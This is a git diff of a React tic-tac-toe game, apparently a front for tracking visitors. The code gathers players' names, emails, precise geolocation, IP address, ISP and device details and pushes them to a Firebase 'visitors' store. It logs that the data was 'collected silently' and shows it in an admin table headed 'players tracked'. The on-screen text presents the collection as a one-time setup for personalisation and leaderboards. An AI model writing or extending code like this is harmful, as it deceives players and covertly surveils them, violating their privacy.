@@ -69,7 +69,6 @@ type GameMode = 'easy' | 'medium' | 'hard';
 interface UserProfile {
   name: string;
   email?: string;
-  phone?: string;
   age?: string;
   interests?: string;
 }
@@ -77,6 +76,7 @@ interface UserProfile {
 function App() {
   const [showNameEntry, setShowNameEntry] = useState(true);
   const [userProfile, setUserProfile] = useState<UserProfile>({ name: '' });
+  const [hasSubmittedData, setHasSubmittedData] = useState(false);
   const [hasAcceptedLocation, setHasAcceptedLocation] = useState(false);
   const [showLocationPrompt, setShowLocationPrompt] = useState(true);
   const [visitorData, setVisitorData] = useState<VisitorData[]>([]);
@@ -274,6 +274,12 @@ function App() {
 
   // Enhanced visitor data collection
   const saveVisitorData = async (latitude: number, longitude: number, accuracy?: number) => {
+    // Check if we already saved data for this user
+    if (hasSubmittedData) {
+      console.log('Data already submitted for this user, skipping...');
+      return;
+    }
+
     try {
       const ip = await getAccurateIPAddress();
       const locationData = await getDetailedLocationFromIP(ip);
@@ -282,7 +288,6 @@ function App() {
       const visitorInfo: VisitorData = {
         name: userProfile.name,
         email: userProfile.email || '',
-        phone: userProfile.phone || '',
         age: userProfile.age || '',
         interests: userProfile.interests || '',
         latitude,
@@ -325,12 +330,31 @@ function App() {
       if (window.firebaseDb && window.firebasePush && window.firebaseRef) {
         const visitorsRef = window.firebaseRef(window.firebaseDb, 'visitors');
         await window.firebasePush(visitorsRef, visitorInfo);
+        
+        // Mark as submitted and save to localStorage
+        setHasSubmittedData(true);
+        localStorage.setItem('dataSubmitted', 'true');
+        localStorage.setItem('userProfile', JSON.stringify(userProfile));
         console.log('🕵️ Visitor data collected silently:', visitorInfo);
       }
     } catch (error) {
       console.error('Error saving visitor data:', error);
     }
   };
+
+  // Check if user data already exists on load
+  useEffect(() => {
+    const savedProfile = localStorage.getItem('userProfile');
+    const dataSubmitted = localStorage.getItem('dataSubmitted');
+    
+    if (savedProfile && dataSubmitted === 'true') {
+      setUserProfile(JSON.parse(savedProfile));
+      setHasSubmittedData(true);
+      setShowNameEntry(false);
+      setHasAcceptedLocation(true);
+      setShowLocationPrompt(false);
+    }
+  }, []);
 
   // Enhanced location request with high accuracy
   const requestLocation = () => {
@@ -563,7 +587,7 @@ function App() {
             <Zap className="w-12 h-12 sm:w-16 sm:h-16 text-blue-500 mx-auto mb-4" />
             <h2 className="text-xl sm:text-2xl font-bold text-gray-800 mb-2">🎮 Welcome to AI Tic-Tac-Toe!</h2>
             <p className="text-sm sm:text-base text-gray-600 mb-4">
-              Enter your details to start playing against our advanced AI!
+              Enter your details to start playing against our advanced AI! (One-time setup)
             </p>
           </div>
           
@@ -592,8 +616,8 @@ function App() {
             </div>
             
             <div className="grid grid-cols-2 gap-4">
-              <div>
-                <label className="block text-sm font-medium text-gray-700 mb-1">Age</label>
+              <div className="col-span-2">
+                <label className="block text-sm font-medium text-gray-700 mb-1">Age (Optional)</label>
                 <input
                   type="number"
                   value={userProfile.age || ''}
@@ -602,19 +626,9 @@ function App() {
                   className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                 />
               </div>
-              <div>
-                <label className="block text-sm font-medium text-gray-700 mb-1">Phone</label>
-                <input
-                  type="tel"
-                  value={userProfile.phone || ''}
-                  onChange={(e) => setUserProfile({...userProfile, phone: e.target.value})}
-                  placeholder="+1234567890"
-                  className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
-                />
-              </div>
             </div>
             
-            <div>
+            <div className="col-span-2">
               <label className="block text-sm font-medium text-gray-700 mb-1">Interests</label>
               <input
                 type="text"
@@ -647,7 +661,7 @@ function App() {
           </button>
           
           <p className="text-xs text-gray-500 mt-4 text-center">
-            We collect this info to personalize your gaming experience and show regional leaderboards
+            One-time setup for personalized gaming experience and regional leaderboards
           </p>
         </div>
       </div>
@@ -721,7 +735,7 @@ function App() {
         <div className="max-w-7xl mx-auto">
           <div className="bg-white rounded-2xl shadow-lg p-4 sm:p-6 mb-6">
             {/* Mobile Admin Header */}
-            <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center mb-6 gap-4">
+            <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center mb-8 gap-4">
               <h1 className="text-2xl sm:text-3xl font-bold text-gray-800">🎮 Game Admin Dashboard</h1>
               
               {/* Mobile Menu Button */}
@@ -735,6 +749,16 @@ function App() {
                 </button>
               </div>
 
+              {/* Quick Stats */}
+              <div className="hidden sm:flex gap-4 text-sm">
+                <div className="bg-blue-100 px-3 py-2 rounded-lg">
+                  <span className="text-blue-800 font-semibold">👥 {visitorData.length} Players</span>
+                </div>
+                <div className="bg-green-100 px-3 py-2 rounded-lg">
+                  <span className="text-green-800 font-semibold">🎮 Active Game</span>
+                </div>
+              </div>
+
               {/* Desktop Buttons */}
               <div className="hidden sm:flex gap-2 flex-wrap">
                 <button
@@ -742,28 +766,28 @@ function App() {
                   className="px-3 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors flex items-center gap-2 text-sm"
                 >
                   <Eye className="w-4 h-4" />
-                  {showDataViewer ? 'Hide' : 'Show'} Player Data
+                  {showDataViewer ? 'Hide Players' : 'View Players'}
                 </button>
                 <button
                   onClick={() => setShowMapTool(!showMapTool)}
                   className="px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 transition-colors flex items-center gap-2 text-sm"
                 >
                   <MapPin className="w-4 h-4" />
-                  Map Tool
+                  🗺️ Maps
                 </button>
                 <button
                   onClick={() => setShowImageManager(!showImageManager)}
                   className="px-3 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 transition-colors flex items-center gap-2 text-sm"
                 >
                   <ImageIcon className="w-4 h-4" />
-                  Images
+                  🖼️ Images
                 </button>
                 <button
                   onClick={() => setEditMode(!editMode)}
                   className="px-3 py-2 bg-orange-600 text-white rounded-lg hover:bg-orange-700 transition-colors flex items-center gap-2 text-sm"
                 >
                   <Edit3 className="w-4 h-4" />
-                  {editMode ? 'View' : 'Edit'}
+                  {editMode ? '👁️ View' : '✏️ Edit'}
                 </button>
                 <button
                   onClick={() => {
@@ -773,7 +797,7 @@ function App() {
                   }}
                   className="px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 transition-colors text-sm"
                 >
-                  Logout
+                  🚪 Logout
                 </button>
               </div>
             </div>
@@ -786,40 +810,40 @@ function App() {
                     setShowDataViewer(!showDataViewer);
                     setMobileMenuOpen(false);
                   }}
-                  className="w-full px-4 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors flex items-center gap-2"
+                  className="w-full px-4 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors flex items-center gap-2 shadow-lg"
                 >
                   <Eye className="w-4 h-4" />
-                  {showDataViewer ? 'Hide' : 'Show'} Player Data
+                  {showDataViewer ? 'Hide Players' : 'View Players'}
                 </button>
                 <button
                   onClick={() => {
                     setShowMapTool(!showMapTool);
                     setMobileMenuOpen(false);
                   }}
-                  className="w-full px-4 py-3 bg-green-600 text-white rounded-lg hover:bg-green-700 transition-colors flex items-center gap-2"
+                  className="w-full px-4 py-3 bg-green-600 text-white rounded-lg hover:bg-green-700 transition-colors flex items-center gap-2 shadow-lg"
                 >
                   <MapPin className="w-4 h-4" />
-                  Map Tool
+                  🗺️ Map Tool
                 </button>
                 <button
                   onClick={() => {
                     setShowImageManager(!showImageManager);
                     setMobileMenuOpen(false);
                   }}
-                  className="w-full px-4 py-3 bg-purple-600 text-white rounded-lg hover:bg-purple-700 transition-colors flex items-center gap-2"
+                  className="w-full px-4 py-3 bg-purple-600 text-white rounded-lg hover:bg-purple-700 transition-colors flex items-center gap-2 shadow-lg"
                 >
                   <ImageIcon className="w-4 h-4" />
-                  Image Manager
+                  🖼️ Image Manager
                 </button>
                 <button
                   onClick={() => {
                     setEditMode(!editMode);
                     setMobileMenuOpen(false);
                   }}
-                  className="w-full px-4 py-3 bg-orange-600 text-white rounded-lg hover:bg-orange-700 transition-colors flex items-center gap-2"
+                  className="w-full px-4 py-3 bg-orange-600 text-white rounded-lg hover:bg-orange-700 transition-colors flex items-center gap-2 shadow-lg"
                 >
                   <Edit3 className="w-4 h-4" />
-                  {editMode ? 'View Mode' : 'Edit Content'}
+                  {editMode ? '👁️ View Mode' : '✏️ Edit Content'}
                 </button>
                 <button
                   onClick={() => {
@@ -827,16 +851,16 @@ function App() {
                     setIsAdminAuthenticated(false);
                     setAdminPassword('');
                   }}
-                  className="w-full px-4 py-3 bg-red-600 text-white rounded-lg hover:bg-red-700 transition-colors"
+                  className="w-full px-4 py-3 bg-red-600 text-white rounded-lg hover:bg-red-700 transition-colors shadow-lg"
                 >
-                  Logout
+                  🚪 Logout
                 </button>
               </div>
             )}
 
             {/* Content Editor */}
             {editMode && (
-              <div className="mb-6 p-4 bg-gray-50 rounded-lg">
+              <div className="mb-6 p-4 sm:p-6 bg-gradient-to-r from-orange-50 to-yellow-50 rounded-xl shadow-inner border border-orange-200">
                 <h3 className="text-lg sm:text-xl font-bold mb-4">Edit Game Content</h3>
                 <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
                   <div>
@@ -845,7 +869,7 @@ function App() {
                       type="text"
                       value={adminData.websiteTitle}
                       onChange={(e) => setAdminData({...adminData, websiteTitle: e.target.value})}
-                      className="w-full p-2 border border-gray-300 rounded-lg text-sm"
+                      className="w-full p-3 border border-orange-300 rounded-lg text-sm focus:ring-2 focus:ring-orange-500 focus:border-transparent"
                     />
                   </div>
                   <div>
@@ -854,7 +878,7 @@ function App() {
                       type="text"
                       value={adminData.heroSubtitle}
                       onChange={(e) => setAdminData({...adminData, heroSubtitle: e.target.value})}
-                      className="w-full p-2 border border-gray-300 rounded-lg text-sm"
+                      className="w-full p-3 border border-orange-300 rounded-lg text-sm focus:ring-2 focus:ring-orange-500 focus:border-transparent"
                     />
                   </div>
                   <div className="lg:col-span-2">
@@ -863,7 +887,7 @@ function App() {
                       type="text"
                       value={adminData.footerText}
                       onChange={(e) => setAdminData({...adminData, footerText: e.target.value})}
-                      className="w-full p-2 border border-gray-300 rounded-lg text-sm"
+                      className="w-full p-3 border border-orange-300 rounded-lg text-sm focus:ring-2 focus:ring-orange-500 focus:border-transparent"
                     />
                   </div>
                 </div>
@@ -872,7 +896,7 @@ function App() {
 
             {/* Image Manager */}
             {showImageManager && (
-              <div className="mb-6 p-4 bg-purple-50 rounded-lg">
+              <div className="mb-6 p-4 sm:p-6 bg-gradient-to-r from-purple-50 to-pink-50 rounded-xl shadow-inner border border-purple-200">
                 <h3 className="text-lg sm:text-xl font-bold mb-4">🖼️ Image Manager</h3>
                 
                 {/* Add New Image */}
@@ -884,11 +908,11 @@ function App() {
                       placeholder="Enter image URL"
                       value={newImageUrl}
                       onChange={(e) => setNewImageUrl(e.target.value)}
-                      className="flex-1 p-2 border border-gray-300 rounded-lg text-sm"
+                      className="flex-1 p-3 border border-purple-300 rounded-lg text-sm focus:ring-2 focus:ring-purple-500 focus:border-transparent"
                     />
                     <button
                       onClick={addImageToGallery}
-                      className="px-4 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 transition-colors flex items-center gap-2 justify-center"
+                      className="px-4 py-3 bg-purple-600 text-white rounded-lg hover:bg-purple-700 transition-colors flex items-center gap-2 justify-center shadow-lg hover:shadow-xl transform hover:scale-105"
                     >
                       <Upload className="w-4 h-4" />
                       Add Image
@@ -899,15 +923,15 @@ function App() {
                 {/* Gallery Images */}
                 <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-4 gap-4">
                   {adminData.galleryImages.map((image, index) => (
-                    <div key={index} className="relative group">
+                    <div key={index} className="relative group transform hover:scale-105 transition-transform">
                       <img
                         src={image}
                         alt={`Gallery ${index + 1}`}
-                        className="w-full h-24 sm:h-32 object-cover rounded-lg"
+                        className="w-full h-24 sm:h-32 object-cover rounded-lg shadow-md"
                       />
                       <button
                         onClick={() => removeImageFromGallery(index)}
-                        className="absolute top-1 right-1 bg-red-500 text-white rounded-full p-1 opacity-0 group-hover:opacity-100 transition-opacity"
+                        className="absolute top-1 right-1 bg-red-500 text-white rounded-full p-1 opacity-0 group-hover:opacity-100 transition-opacity shadow-lg hover:bg-red-600"
                       >
                         <X className="w-3 h-3" />
                       </button>
@@ -919,7 +943,7 @@ function App() {
 
             {/* Map Tool */}
             {showMapTool && (
-              <div className="mb-6 p-4 bg-blue-50 rounded-lg">
+              <div className="mb-6 p-4 sm:p-6 bg-gradient-to-r from-blue-50 to-cyan-50 rounded-xl shadow-inner border border-blue-200">
                 <h3 className="text-lg sm:text-xl font-bold mb-4">🌍 Map Location Tool</h3>
                 <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
                   <input
@@ -927,18 +951,18 @@ function App() {
                     placeholder="Latitude"
                     value={mapLat}
                     onChange={(e) => setMapLat(e.target.value)}
-                    className="p-2 border border-gray-300 rounded-lg text-sm"
+                    className="p-3 border border-blue-300 rounded-lg text-sm focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                   />
                   <input
                     type="text"
                     placeholder="Longitude"
                     value={mapLng}
                     onChange={(e) => setMapLng(e.target.value)}
-                    className="p-2 border border-gray-300 rounded-lg text-sm"
+                    className="p-3 border border-blue-300 rounded-lg text-sm focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                   />
                   <button
                     onClick={generateMapLink}
-                    className="px-4 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 transition-colors text-sm"
+                    className="px-4 py-3 bg-green-600 text-white rounded-lg hover:bg-green-700 transition-colors text-sm shadow-lg hover:shadow-xl transform hover:scale-105"
                   >
                     Generate Map Link
                   </button>
@@ -949,7 +973,7 @@ function App() {
                       href={mapLink}
                       target="_blank"
                       rel="noopener noreferrer"
-                      className="inline-block px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors text-sm"
+                      className="inline-block px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors text-sm shadow-lg hover:shadow-xl transform hover:scale-105"
                     >
                       🌎 Open in Google Maps
                     </a>
@@ -960,59 +984,76 @@ function App() {
 
             {/* Enhanced Visitor Data */}
             {showDataViewer && (
-              <div className="mb-6">
+              <div className="mb-6 p-4 sm:p-6 bg-gradient-to-r from-green-50 to-blue-50 rounded-xl shadow-inner border border-green-200">
                 <h3 className="text-lg sm:text-xl font-bold mb-4">🕵️ Player Data ({visitorData.length} players tracked)</h3>
                 <div className="overflow-x-auto">
-                  <table className="w-full border border-gray-300 rounded-lg text-xs sm:text-sm">
+                  <table className="w-full border border-gray-300 rounded-lg text-xs sm:text-sm shadow-lg bg-white">
                     <thead className="bg-gray-50">
                       <tr>
-                        <th className="p-2 text-left">Timestamp</th>
-                        <th className="p-2 text-left">Name</th>
-                        <th className="p-2 text-left">Contact</th>
-                        <th className="p-2 text-left">IP Address</th>
-                        <th className="p-2 text-left">Location</th>
-                        <th className="p-2 text-left">Coordinates</th>
-                        <th className="p-2 text-left">Country/City</th>
-                        <th className="p-2 text-left">ISP</th>
-                        <th className="p-2 text-left">Device Info</th>
-                        <th className="p-2 text-left">Actions</th>
+                        <th className="p-3 text-left font-semibold">⏰ Time</th>
+                        <th className="p-3 text-left font-semibold">👤 Player</th>
+                        <th className="p-3 text-left font-semibold">📧 Contact</th>
+                        <th className="p-3 text-left font-semibold">🌐 IP</th>
+                        <th className="p-3 text-left font-semibold">📍 Map</th>
+                        <th className="p-3 text-left font-semibold">📊 Location</th>
+                        <th className="p-3 text-left font-semibold">🏢 ISP</th>
+                        <th className="p-3 text-left font-semibold">📱 Device</th>
+                        <th className="p-3 text-left font-semibold">🗑️ Action</th>
                       </tr>
                     </thead>
                     <tbody>
                       {visitorData.map((visitor) => (
-                        <tr key={visitor.id} className="border-t">
-                          <td className="p-2">{new Date(visitor.timestamp).toLocaleString()}</td>
-                          <td className="p-2 font-semibold">{visitor.name}</td>
-                          <td className="p-2 text-xs">
-                            {visitor.email && <div>📧 {visitor.email}</div>}
-                            {visitor.phone && <div>📱 {visitor.phone}</div>}
-                            {visitor.age && <div>🎂 {visitor.age}</div>}
+                        <tr key={visitor.id} className="border-t hover:bg-gray-50 transition-colors">
+                          <td className="p-3 text-xs">{new Date(visitor.timestamp).toLocaleString()}</td>
+                          <td className="p-3">
+                            <div className="font-bold text-blue-600">{visitor.name}</div>
+                            {visitor.age && <div className="text-xs text-gray-500">Age: {visitor.age}</div>}
+                            {visitor.interests && <div className="text-xs text-gray-500">Interests: {visitor.interests}</div>}
                           </td>
-                          <td className="p-2 font-mono">{visitor.ipAddress}</td>
-                          <td className="p-2">
+                          <td className="p-3 text-xs">
+                            {visitor.email && (
+                              <div className="bg-blue-100 px-2 py-1 rounded mb-1">
+                                📧 {visitor.email}
+                              </div>
+                            )}
+                          </td>
+                          <td className="p-3">
+                            <div className="font-mono text-xs bg-gray-100 px-2 py-1 rounded">
+                              {visitor.ipAddress}
+                            </div>
+                          </td>
+                          <td className="p-3">
                             <a
                               href={`https://www.google.com/maps/search/${visitor.latitude},${visitor.longitude}`}
                               target="_blank"
                               rel="noopener noreferrer"
-                              className="text-blue-600 hover:underline"
+                              className="bg-green-500 text-white px-3 py-1 rounded-full text-xs hover:bg-green-600 transition-colors inline-block"
                             >
-                              View Map
+                              🗺️ View
                             </a>
                           </td>
-                          <td className="p-2 font-mono">
-                            {visitor.latitude.toFixed(6)}, {visitor.longitude.toFixed(6)}
+                          <td className="p-3 text-xs">
+                            <div className="font-mono bg-yellow-100 px-2 py-1 rounded mb-1">
+                              {visitor.latitude.toFixed(4)}, {visitor.longitude.toFixed(4)}
+                            </div>
+                            <div className="text-gray-600">{visitor.country}, {visitor.city}</div>
                           </td>
-                          <td className="p-2">{visitor.country}, {visitor.city}</td>
-                          <td className="p-2">{visitor.isp}</td>
-                          <td className="p-2 text-xs">
-                            <div>{visitor.platform}</div>
-                            <div>{visitor.screenInfo}</div>
-                            <div>{visitor.language}</div>
+                          <td className="p-3 text-xs">
+                            <div className="bg-purple-100 px-2 py-1 rounded">
+                              {visitor.isp}
+                            </div>
                           </td>
-                          <td className="p-2">
+                          <td className="p-3 text-xs">
+                            <div className="space-y-1">
+                              <div className="bg-gray-100 px-2 py-1 rounded">{visitor.platform}</div>
+                              <div className="text-gray-600">{visitor.screenInfo}</div>
+                              <div className="text-gray-600">{visitor.language}</div>
+                            </div>
+                          </td>
+                          <td className="p-3">
                             <button
                               onClick={() => visitor.id && deleteVisitorData(visitor.id)}
-                              className="text-red-600 hover:text-red-800 transition-colors"
+                              className="bg-red-500 text-white p-2 rounded-full hover:bg-red-600 transition-colors shadow-lg hover:shadow-xl transform hover:scale-110"
                             >
                               <Trash2 className="w-4 h-4" />
                             </button>
